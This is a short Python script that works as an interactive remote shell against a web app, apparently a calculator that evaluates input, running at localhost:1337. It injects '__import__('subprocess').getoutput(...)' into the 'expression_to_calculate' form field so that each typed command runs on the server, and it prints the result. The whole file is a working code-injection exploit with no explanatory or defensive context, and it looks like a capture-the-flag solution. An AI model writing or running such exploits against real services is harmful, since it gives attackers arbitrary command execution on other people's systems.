from urllib.parse import quote as url_encode
from requests import post

url = "http://localhost:1337/result"

while True:
	command = input(">> ")
	if command == "exit":
		break
	try:
		payload = f"__import__('subprocess').getoutput('{command}')"
		data = {"expression_to_calculate": payload}
		response = post(url, data=data)

		if response.status_code == 200:
			print(response.text)
		else:
			print(f"Error: {response.status_code} - {response.reason}")

	except Exception as e:
		print(f"An unexpected error occurred: {e}")
		break
